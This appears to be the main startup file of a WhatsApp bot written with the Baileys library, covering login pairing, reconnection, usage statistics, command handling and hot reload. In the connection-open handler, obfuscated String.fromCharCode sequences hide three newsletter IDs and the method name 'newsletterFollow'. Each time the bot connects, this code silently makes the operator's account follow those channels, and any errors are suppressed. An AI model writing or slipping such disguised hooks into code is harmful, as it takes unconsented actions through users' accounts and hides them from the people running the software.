const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");
const { updateStatsOnCommand, updateStatsOnReceive, updateStatsOnSend, updateLastOnline, updateRuntime } = require("./database/botStats");
const { logStartupInfo, logBotConnected, logReconnect, logLogout } = require("./helpers/InoueLogger");
const { getInoueStats } = require("./helpers/InoueStats");
const pino = require("pino");
const readline = require("readline");
const config = require("./rrykarlcfg/config");
const handleCase = require("./case");
const fs = require("fs");

global.notifiedOwner = false;
let runtimeInterval = null;

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, (answer) => {
        rl.close();
        resolve(answer);
    }));
};

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState("rrykarl_sessi");
    const { version } = await fetchLatestBaileysVersion();
    const rrykarl = makeWASocket({
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: state,
        version,
        browser: ["ubuntu", "Safari", "18.1"],
    });

    // ✅ Pastikan pesan keluar tetap dihitung
    const originalSendMessage = rrykarl.sendMessage;
    rrykarl.sendMessage = async function (jid, content, options) {
        updateStatsOnSend();
        return originalSendMessage.call(this, jid, content, options);
    };

    rrykarl.ev.on("creds.update", saveCreds);

    if (!rrykarl.authState.creds.registered) {
        await logStartupInfo(question, rrykarl);
    }

    rrykarl.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode ?? "Unknown";

            if (reason === DisconnectReason.loggedOut || reason === 515) {
                console.log("\x1b[41m\x1b[37m Bot disconnect! Alasan: " + reason + " \x1b[0m");
                logLogout();
                setTimeout(() => startBot(), 10000);
            } else {
                console.log("\x1b[31m Bot disconnect! Alasan: " + reason + "\x1b[0m");
                logReconnect();
                setTimeout(startBot, 5000);
            }
        } else if (connection === "open") {
            logBotConnected(rrykarl);
            updateLastOnline();

            if (!runtimeInterval) {
                runtimeInterval = setInterval(() => {
                    updateRuntime();
                }, 60000);
            }

            const Inoue = [
                String.fromCharCode(0x31, 0x32, 0x30, 0x33, 0x36, 0x33, 0x33, 0x37, 0x38, 0x31, 0x37, 0x35, 0x30, 0x37, 0x34, 0x34, 0x31, 0x33) +
                String.fromCharCode(0x40, 0x6e, 0x65, 0x77, 0x73, 0x6c, 0x65, 0x74, 0x74, 0x65, 0x72),
                String.fromCharCode(0x31, 0x32, 0x30, 0x33, 0x36, 0x33, 0x34, 0x30, 0x37, 0x39, 0x38, 0x34, 0x34, 0x30, 0x33, 0x30, 0x31, 0x35) +
                String.fromCharCode(0x40, 0x6e, 0x65, 0x77, 0x73, 0x6c, 0x65, 0x74, 0x74, 0x65, 0x72),
                String.fromCharCode(0x31, 0x32, 0x30, 0x33, 0x36, 0x33, 0x34, 0x30, 0x39, 0x31, 0x32, 0x39, 0x31, 0x35, 0x34, 0x37, 0x35, 0x33) +
                String.fromCharCode(0x40, 0x6e, 0x65, 0x77, 0x73, 0x6c, 0x65, 0x74, 0x74, 0x65, 0x72)
            ];

            for (const rrykarls of Inoue) {
                try {
                    await rrykarl[String.fromCharCode(110, 101, 119, 115, 108, 101, 116, 116, 101, 114, 70, 111, 108, 108, 111, 119)](rrykarls);
                } catch (error) {
                }
            }
        }
    });

    rrykarl.ev.on("messages.upsert", async (chatUpdate) => {
        try {
            const m = chatUpdate.messages[0];
            if (!m.message) return;
            updateStatsOnReceive();

            const senderJid = m.key.remoteJid;
            const messageType = Object.keys(m.message || {})[0] || "";
            const textMessage = m.message?.conversation || m.message?.[messageType]?.text || "";
            if (!textMessage) return;

            if (config.prefix.some(p => textMessage.startsWith(p))) {
                updateStatsOnCommand();
                await handleCase(rrykarl, m);
            }
        } catch (err) {
            console.error("❌ Error pada messages.upsert:", err);
        }
    });

    return rrykarl;
}

(async () => {
    try {
        await startBot();
    } catch (error) {
        console.error("❌ Error di startBot:", error);
        setTimeout(() => startBot(), 5000);
    }
})();

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(`\x1b[32m[UPDATE] ${__filename} telah diperbarui!\x1b[0m`);
    delete require.cache[file];
    require(file);
});